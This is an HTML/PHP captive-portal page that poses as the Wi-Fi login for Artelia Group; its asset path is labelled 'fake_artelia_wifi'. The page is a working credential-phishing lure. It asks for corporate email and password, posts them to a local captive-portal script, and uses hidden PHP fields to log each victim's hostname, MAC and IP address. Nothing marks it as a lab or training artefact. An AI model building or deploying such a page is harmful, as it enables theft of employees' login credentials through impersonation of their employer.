<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion Artelia Group</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      background: #0f172a;
      overflow: hidden;
    }

    /* Canvas particules */
    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    /* Form container blanc avec glow */
    .form-container {
      background: white;
      border-radius: 1.5rem;
      box-shadow: 0 0 30px rgba(59, 130, 246, 0.3);
      padding: 2.5rem;
      width: 100%;
      max-width: 400px;
      position: relative;
      z-index: 10;
    }

    .input-glow:focus {
      box-shadow: 0 0 10px rgba(59, 130, 246, 0.7);
    }

    /* Toggle password button */
    .toggle-password {
      position: absolute;
      right: 1rem;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 1rem;
      color: #6b7280;
      transition: color 0.2s;
    }
    .toggle-password:hover {
      color: #3b82f6;
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen">

  <!-- Canvas particules -->
  <canvas id="particles"></canvas>

  <!-- Formulaire central -->
  <div class="form-container">
    <div class="text-center mb-8">
      <img src="/fake_artelia_wifi/assets/artelia_logo.jpg" alt="Artelia Group" class="mx-auto w-32">
      <h1 class="text-gray-800 text-2xl font-bold mt-4">Portail Wi-Fi Artelia</h1>
      <p class="text-gray-500 mt-2 text-sm">Connectez-vous avec identifiants <strong>ARTELIA GROUP</strong> pour accéder au réseau</p>
    </div>

    <form id="loginForm" method="POST" action="/captiveportal/index.php" class="space-y-6 relative">
      <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
      <input type="hidden" name="target" value="<?=$destination?>">

      <!-- Email -->
      <div class="relative">
        <input type="email" name="email" id="email" placeholder=" " required
          class="peer w-full rounded-xl px-4 py-3 bg-gray-100 text-gray-800 placeholder-transparent focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-blue-400 input-glow transition-all"/>
        <label for="email" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-sm peer-focus:-top-2 peer-focus:text-blue-500 peer-focus:text-xs">Adresse e-mail</label>
      </div>

      <!-- Password -->
      <div class="relative">
        <input type="password" name="password" id="password" placeholder=" " required
          class="peer w-full rounded-xl px-4 py-3 bg-gray-100 text-gray-800 placeholder-transparent focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-blue-400 input-glow transition-all"/>
        <label for="password" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-sm peer-focus:-top-2 peer-focus:text-blue-500 peer-focus:text-xs">Mot de passe</label>
        <button type="button" id="togglePw" class="toggle-password">👁️</button>
      </div>

      <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all duration-200 hover:scale-105">Se connecter</button>
    </form>

    <p class="text-gray-400 text-center text-sm mt-6">© 2025 Artelia Group. Tous droits réservés.</p>
  </div>

  <!-- Script toggle password -->
  <script>
    const togglePw = document.getElementById('togglePw');
    const password = document.getElementById('password');

    togglePw.addEventListener('click', () => {
      if (password.type === 'password') {
        password.type = 'text';
        togglePw.textContent = '🙈';
      } else {
        password.type = 'password';
        togglePw.textContent = '👁️';
      }
    });
  </script>

  <!-- Script particules -->
  <script>
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particlesArray;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      init();
    });

    class Particle {
      constructor(x, y, size, speedX, speedY) {
        this.x = x;
        this.y = y;
        this.size = size;
        this.speedX = speedX;
        this.speedY = speedY;
      }
      update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
        if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
      }
      draw() {
        ctx.fillStyle = 'rgba(59, 130, 246, 0.7)';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    function init() {
      particlesArray = [];
      let numberOfParticles = (canvas.width * canvas.height) / 15000;
      for (let i = 0; i < numberOfParticles; i++) {
        let size = Math.random() * 3 + 1;
        let x = Math.random() * canvas.width;
        let y = Math.random() * canvas.height;
        let speedX = (Math.random() - 0.5) * 0.5;
        let speedY = (Math.random() - 0.5) * 0.5;
        particlesArray.push(new Particle(x, y, size, speedX, speedY));
      }
    }

    function connectParticles() {
      let opacityValue = 0.3;
      for (let a = 0; a < particlesArray.length; a++) {
        for (let b = a; b < particlesArray.length; b++) {
          let dx = particlesArray[a].x - particlesArray[b].x;
          let dy = particlesArray[a].y - particlesArray[b].y;
          let distance = Math.sqrt(dx*dx + dy*dy);
          if (distance < 120) {
            ctx.strokeStyle = `rgba(59, 130, 246, ${opacityValue})`;
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
            ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
            ctx.stroke();
          }
        }
      }
    }

    function animate() {
      ctx.clearRect(0,0,canvas.width, canvas.height);
      particlesArray.forEach(p => {
        p.update();
        p.draw();
      });
      connectParticles();
      requestAnimationFrame(animate);
    }

    init();
    animate();
  </script>

</body>
</html>
